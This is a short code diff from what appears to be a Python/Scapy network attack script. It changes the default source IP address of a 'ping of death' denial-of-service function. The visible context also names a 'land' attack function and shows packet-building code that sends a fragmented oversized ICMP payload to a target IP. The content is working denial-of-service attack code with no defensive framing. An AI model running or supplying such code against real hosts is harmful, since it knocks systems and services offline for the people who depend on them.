@@ -50,7 +50,7 @@ def land(target_ip, target_port, packets_send=1000):
 # Denial of service ping of death
 # Send a malicious ping to another computer that exceeds that maximum IPv4
 # packet size which is 65,535 bytes
-def pod(target_ip, src_ip="192.168.147.152"):
+def pod(target_ip, src_ip="192.168.147.154"):
     print("Executing pod at: " + str(datetime.now()))
     i = IP(src=src_ip, dst=target_ip)
     f = fragment(i/ICMP()/(str('X' * 60000)))
